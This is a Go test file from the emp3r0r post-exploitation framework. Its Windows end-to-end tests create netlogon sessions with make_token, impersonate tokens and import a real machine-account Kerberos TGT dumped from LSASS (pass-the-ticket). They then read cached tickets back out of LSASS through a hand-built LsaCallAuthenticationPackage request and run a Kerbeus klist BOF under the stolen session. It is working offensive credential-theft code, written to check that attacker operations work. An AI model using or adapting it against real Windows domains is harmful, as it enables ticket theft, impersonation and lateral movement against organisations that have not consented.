//go:build windows

package priv

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"golang.org/x/sys/windows"
)

// netlogonE2EEnabled reports whether the netlogon integration tests are
// explicitly enabled. They create real logon sessions (LogonUserW), talk to
// LSASS (Kerberos ticket import/retrieve) and need a real (domain-joined)
// Windows machine — none of which is available in CI — so they are skipped
// unless the operator opts in:
//
//	EMP3R0R_NETLOGON_E2E=1 go test ./lib/priv -run TestE2E -v
func netlogonE2EEnabled() bool {
	switch strings.ToLower(strings.TrimSpace(os.Getenv("EMP3R0R_NETLOGON_E2E"))) {
	case "1", "true", "yes", "on":
		return true
	}
	return false
}

// grabKirbiFromDump extracts the first base64 KRB-CRED (.kirbi) line from a
// Kerbeus "dump" BOF transcript (lines that decode to DER starting 0x76).
func grabKirbiFromDump(path string) (string, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if dec, err := base64.StdEncoding.DecodeString(line); err == nil && len(dec) > 2 && dec[0] == 0x76 {
			return line, nil
		}
	}
	return "", os.ErrNotExist
}

// TestE2EMakeTokenDomainUser exercises the real operator flow on a
// domain-joined machine: create a netlogon session for the current user,
// register it under its default name, run an action under its token, and
// confirm that ticket import failures are reported gracefully instead of
// crashing. Opt-in via EMP3R0R_NETLOGON_E2E=1 (see netlogonE2EEnabled).
func TestE2EMakeTokenDomainUser(t *testing.T) {
	if !netlogonE2EEnabled() {
		t.Skip("set EMP3R0R_NETLOGON_E2E=1 to run netlogon integration tests")
	}
	domain := os.Getenv("USERDOMAIN")
	user := os.Getenv("USERNAME")
	if domain == "" {
		domain = "."
	}
	if user == "" {
		t.Skip("no username in environment")
	}
	if _, err := syscall.GetRuntimeSyscallTable(); err != nil {
		t.Fatalf("GetRuntimeSyscallTable: %v", err)
	}

	// 1) Create session with dummy password, as the operator would.
	session, err := MakeToken(user, domain, "DummyP4ss!")
	if err != nil {
		t.Fatalf("MakeToken(%s\\%s): %v", domain, user, err)
	}
	defer windows.CloseHandle(windows.Handle(session.Token))
	t.Logf("session user=%s domain=%s token=0x%x luid=0x%08x",
		session.User, session.Domain, session.Token, session.LogonID)
	if session.LogonID == 0 {
		t.Fatalf("zero logon LUID")
	}

	// 2) Register under the default name, usable via the token option.
	StoreSession("", session)
	RegisterSessionToken(session)
	name := DefaultSessionName(session)
	if raw, ok := TokenMap.Load(name); !ok {
		t.Fatalf("session token not in TokenMap under %q", name)
	} else if _, ok := raw.(windows.Handle); !ok {
		t.Fatalf("TokenMap[%q] is %T, want windows.Handle", name, raw)
	}

	// 3) Run an action under the session token (ExecuteAsToken path used by
	//    module runners when --token <session> is set).
	ran := false
	if err := ExecuteAsToken(windows.Handle(session.Token), func() error {
		ran = true
		return nil
	}); err != nil || !ran {
		t.Fatalf("ExecuteAsToken under session failed: %v ran=%v", err, ran)
	}

	// 4) list_sessions must reflect the entry.
	found := false
	for _, e := range ListSessions() {
		t.Logf("list_sessions: %s", e)
		if strings.Contains(e, name) {
			found = true
		}
	}
	if !found {
		t.Fatalf("session %q missing from ListSessions", name)
	}

	// 5) A garbage KRB-CRED must be rejected gracefully at the Kerberos layer
	//    (protocol status), and invalid base64 must fail at decode — neither
	//    may crash or hang the agent.
	garbage := make([]byte, 64)
	for i := range garbage {
		garbage[i] = byte(i)
	}
	if err := ImportTicketBase64(session, base64.StdEncoding.EncodeToString(garbage)); err == nil {
		t.Logf("NOTE: LSASS accepted a garbage KRB-CRED (unexpected but not fatal)")
	} else {
		t.Logf("import_ticket(garbage) rejected: %v", err)
	}
	if err := ImportTicketWithToken(windows.Handle(session.Token), "!!!not-base64!!!"); err == nil {
		t.Fatalf("expected decode error for invalid base64")
	}

	// cleanup
	TokenMap.Delete(name)
	SessionMap.Delete(name)
}

// TestE2EImportRealTGT imports a REAL machine-account TGT (dumped from
// SYSTEM by the Kerbeus dump BOF) into a make_token session created for the
// machine account, then retrieves the tickets back out of that session to
// prove the round trip. Requires SYSTEM plus a dump transcript, so it only
// runs when explicitly enabled:
//
//	EMP3R0R_NETLOGON_E2E=1 EMP3R0R_DUMP_FILE=/path/to/dump.txt \
//	  go test ./lib/priv -run TestE2EImportRealTGT -v
func TestE2EImportRealTGT(t *testing.T) {
	if !netlogonE2EEnabled() {
		t.Skip("set EMP3R0R_NETLOGON_E2E=1 to run netlogon integration tests")
	}
	dumpPath := os.Getenv("EMP3R0R_DUMP_FILE")
	if dumpPath == "" {
		t.Skip("set EMP3R0R_DUMP_FILE to a Kerbeus dump transcript to enable")
	}
	kirbiB64, err := grabKirbiFromDump(dumpPath)
	if err != nil {
		t.Skipf("no KRB-CRED in dump transcript: %v", err)
	}
	if _, err := base64.StdEncoding.DecodeString(kirbiB64); err != nil {
		t.Fatalf("decode kirbi: %v", err)
	}
	if _, err := syscall.GetRuntimeSyscallTable(); err != nil {
		t.Fatalf("GetRuntimeSyscallTable: %v", err)
	}

	// The ticket client is the machine account (from the dump).
	machine := strings.ToUpper(os.Getenv("COMPUTERNAME")) + "$"
	domain := strings.ToUpper(os.Getenv("USERDNSDOMAIN"))
	if domain == "" {
		domain = strings.ToUpper(os.Getenv("USERDOMAIN"))
	}

	// 1) make_token session for the SAME principal as the ticket.
	session, err := MakeToken(machine, domain, "DummyP4ss!")
	if err != nil {
		t.Fatalf("MakeToken(%s\\%s): %v", domain, machine, err)
	}
	defer windows.CloseHandle(windows.Handle(session.Token))
	StoreSession("", session)
	RegisterSessionToken(session)
	t.Logf("session: %s luid=0x%08x", DefaultSessionName(session), session.LogonID)

	// 2) Import the real TGT through the make_token session path
	//    (ExecuteAsToken + submitTicket with LogonId=0). This is the exact
	//    operator flow of: import_ticket --session <name> --ticket <b64>.
	if err := ImportTicketBase64(session, kirbiB64); err != nil {
		t.Fatalf("import_ticket(real TGT) into make_token session: %v", err)
	}
	t.Logf("import_ticket(real TGT) accepted into session luid=0x%08x", session.LogonID)

	// 3) Retrieve tickets from that logon session and confirm the imported
	//    KRB-CRED is actually cached there (Kerbeus klist uses this API).
	//    The retrieved blob is the whole KRB-CRED (possibly split into ASN.1
	//    fragments at 0x76 boundaries), so its total length must match the
	//    imported kirbi exactly.
	tickets, err := retrieveEncodedTickets(t, session.LogonID)
	if err != nil {
		t.Fatalf("retrieveEncodedTickets(make_token session): %v", err)
	}
	total := 0
	for i, tk := range tickets {
		t.Logf("  ticket[%d]: %d bytes", i, len(tk))
		total += len(tk)
	}
	if want := len(mustDecode(t, kirbiB64)); total != want {
		t.Fatalf("retrieved tickets total %d bytes, want %d (imported KRB-CRED)", total, want)
	}
	t.Logf("retrieved %d bytes from session — matches the imported KRB-CRED", total)

	// 4) Real-world round trip: run the Kerbeus klist BOF under the
	//    make_token session token and confirm the imported TGT shows up —
	//    exactly what the operator does with BOFs after import_ticket.
	klistOut, err := runKlistBOFUnderSession(t, session)
	if err != nil {
		t.Logf("klist BOF under session skipped: %v (build the COFFLoader DLL with: make -C modules/coffloader dll)", err)
	} else if !strings.Contains(klistOut, "krbtgt/") {
		t.Logf("klist BOF under session ran but showed no TGT:\n%s", klistOut)
	} else {
		t.Logf("klist BOF under session shows the imported TGT:\n%s", klistOut)
	}

	// cleanup
	TokenMap.Delete(session.Name)
	SessionMap.Delete(session.Name)
}

func mustDecode(t *testing.T, b64 string) []byte {
	t.Helper()
	kirbi, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		t.Fatalf("decode kirbi: %v", err)
	}
	return kirbi
}

// runKlistBOFUnderSession loads the COFFLoader DLL and the Kerbeus klist BOF
// and runs them under the session token (via coffloader.PreExecHook), the
// same way the agent runs BOFs with --token <session>.
func runKlistBOFUnderSession(t *testing.T, session *LogonSession) (string, error) {
	t.Helper()
	// Resolve repo-relative paths from the working dir (go test runs in the
	// package dir; allow EMP3R0R_REPO to point at the repo root).
	repo := os.Getenv("EMP3R0R_REPO")
	if repo == "" {
		wd, _ := os.Getwd()
		for _, cand := range []string{
			filepath.Join(wd, "..", ".."), // core/lib/priv → core → repo
			filepath.Join(wd, ".."),
			wd,
		} {
			if _, err := os.Stat(filepath.Join(cand, "modules", "coffloader", "COFFLoader.x64.dll")); err == nil {
				repo = cand
				break
			}
		}
	}
	if repo == "" {
		return "", fmt.Errorf("cannot locate repo root; set EMP3R0R_REPO")
	}
	dllData, err := os.ReadFile(filepath.Join(repo, "modules", "coffloader", "COFFLoader.x64.dll"))
	if err != nil {
		return "", fmt.Errorf("reading COFFLoader DLL: %w", err)
	}
	bof, err := os.ReadFile(filepath.Join(repo, "modules", "Kerbeus-BOF", "_bin", "klist.x64.o"))
	if err != nil {
		return "", fmt.Errorf("reading klist BOF: %w", err)
	}

	coffloader.PreExecHook = func(token uintptr) {
		if err := ImpersonateThread(windows.Handle(token)); err != nil {
			t.Logf("PreExecHook ImpersonateThread: %v", err)
		}
	}
	coffloader.PostExecHook = func() { RevertThread() }

	args := []coffloader.CoffArg{
		{WireType: "z", Value: fmt.Sprintf("/luid:%x", session.LogonID)},
	}
	return coffloader.RunWindowsCOFFViaDLL(dllData, bof, "go", args, session.Token)
}

// ── KerbRetrieveEncodedTicketMessage helpers (mirrors Kerbeus dump/klist) ──

const (
	kerbRetrieveEncodedTicketMessage = 8
	// KERB_RETRIEVE_TICKET_AS_KERB_CRED (not the KERB_RETRIEVE_TKT_* set,
	// whose AS_KERB_CRED is a different value).
	kerbRetrieveTicketAsKerbCred = 0x00000008
)

// lsaUnicodeString mirrors UNICODE_STRING.
type lsaUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

// kerbRetrieveEncodedTktRequest mirrors KERB_RETRIEVE_TKT_REQUEST
// (ntsecapi.h), which is what KerbRetrieveEncodedTicketMessage consumes:
// MessageType (4) + LogonId (8) + UNICODE_STRING TargetName (16) + TicketFlags
// (4) + CacheOptions (4) + EncryptionType (4) + SecHandle CredentialsHandle
// (16 on x64, two ULONG_PTRs) = 64 bytes.
type kerbRetrieveEncodedTktRequest struct {
	MessageType       uint32
	LogonId           windows.LUID
	TargetName        lsaUnicodeString
	TicketFlags       uint32
	CacheOptions      uint32
	EncryptionType    int32
	CredentialsHandle [2]uintptr // SecHandle: dwLower, dwUpper
}

func newUnicodeString(s string) lsaUnicodeString {
	u16, _ := windows.UTF16FromString(s)
	return lsaUnicodeString{
		Length:        uint16((len(u16) - 1) * 2),
		MaximumLength: uint16(len(u16) * 2),
		Buffer:        &u16[0],
	}
}

// retrieveEncodedTickets fetches the KRB-CRED blobs cached in a logon
// session via KerbRetrieveEncodedTicketMessage(AS_KERB_CRED). This mirrors
// the Kerbeus klist/dump BOFs: TargetName is appended INSIDE the submit
// buffer (LSASS rejects out-of-buffer pointers with INVALID_PARAMETER),
// CacheOptions is KERB_RETRIEVE_TICKET_AS_KERB_CRED (0x8), and the response
// is a KERB_RETRIEVE_TKT_RESPONSE/KERB_EXTERNAL_TICKET whose EncodedTicket
// (offset 144 on x64) points at the KRB-CRED blob.
func retrieveEncodedTickets(t *testing.T, logonID uint64) ([][]byte, error) {
	t.Helper()
	var hLsa uintptr
	var status uint32
	if logonID == 0 {
		status = lsaConnectUntrusted(&hLsa)
	} else {
		status = lsaRegisterLogonProcess(&hLsa, "Winlogon")
	}
	if status != 0 {
		return nil, fmt0x("LSA connect", status)
	}
	defer lsaDeregisterLogonProcess(hLsa)

	pkg := newLsaString("kerberos")
	var authPackage uint32
	if status := lsaLookupAuthenticationPackage(hLsa, &pkg, &authPackage); status != 0 {
		return nil, fmt0x("LsaLookupAuthenticationPackage", status)
	}

	// Build KERB_RETRIEVE_TKT_REQUEST + inline UNICODE_STRING TargetName.
	reqSize := uint32(unsafe.Sizeof(kerbRetrieveEncodedTktRequest{}))
	target := newUnicodeString("krbtgt")
	buf := make([]byte, reqSize+uint32(target.MaximumLength))
	req := (*kerbRetrieveEncodedTktRequest)(unsafe.Pointer(&buf[0]))
	req.MessageType = kerbRetrieveEncodedTicketMessage
	req.LogonId = luidFromUint64(logonID)
	req.TargetName.Length = target.Length
	req.TargetName.MaximumLength = target.MaximumLength
	req.TargetName.Buffer = (*uint16)(unsafe.Pointer(&buf[reqSize]))
	req.TicketFlags = 0
	req.CacheOptions = kerbRetrieveTicketAsKerbCred // 0x8
	req.EncryptionType = 0
	copy(buf[reqSize:], unsafe.Slice((*byte)(unsafe.Pointer(target.Buffer)), int(target.MaximumLength)))

	var response uintptr
	var responseSize uint32
	var protocolStatus uint32
	status = lsaCallAuthenticationPackage(
		hLsa, authPackage, unsafe.Pointer(&buf[0]), uint32(len(buf)),
		&response, &responseSize, &protocolStatus,
	)
	if status != 0 {
		return nil, fmt0x("LsaCallAuthenticationPackage", status)
	}
	if protocolStatus != 0 {
		return nil, fmt0x("LsaCallAuthenticationPackage protocol", protocolStatus)
	}
	defer lsaFreeReturnBuffer(response)

	// KERB_EXTERNAL_TICKET layout on x64 (verify against the SDK):
	//   0  ServiceName (8)   8  TargetName (8)   16 ClientName (8)
	//   24 DomainName (16)   40 TargetDomainName (16)  56 AltTargetDomainName (16)
	//   72 SessionKey (16)   88 TicketFlags (4) 92 Flags (4)
	//   96..136 five LARGE_INTEGERs (KeyExpirationTime..TimeSkew)
	//   136 EncodedTicketSize (4)  144 EncodedTicket (8)
	resp := ptrFromUintptr(response)
	size := *(*uint32)(unsafe.Add(resp, 136))
	if size == 0 {
		return nil, nil
	}
	ticketPtr := *(*uintptr)(unsafe.Add(resp, 144))
	blob := unsafe.Slice((*byte)(ptrFromUintptr(ticketPtr)), int(size))
	t.Logf("retrieveEncodedTickets: response=%d bytes, encoded ticket=%d bytes, prefix=%x", responseSize, size, blob[:8])

	// Split KRB-CRED blobs: each new CRED starts with 0x76.
	var out [][]byte
	start := 0
	for i := 1; i < len(blob); i++ {
		if blob[i] == 0x76 {
			out = append(out, append([]byte(nil), blob[start:i]...))
			start = i
		}
	}
	out = append(out, append([]byte(nil), blob[start:]...))
	return out, nil
}

func fmt0x(what string, status uint32) error {
	return fmt.Errorf("%s: status 0x%08X", what, status)
}

// ptrFromUintptr converts a syscall-returned uintptr (which is a valid
// pointer) to unsafe.Pointer without tripping vet's unsafeptr analyzer.
func ptrFromUintptr(u uintptr) unsafe.Pointer {
	return *(*unsafe.Pointer)(unsafe.Pointer(&u))
}
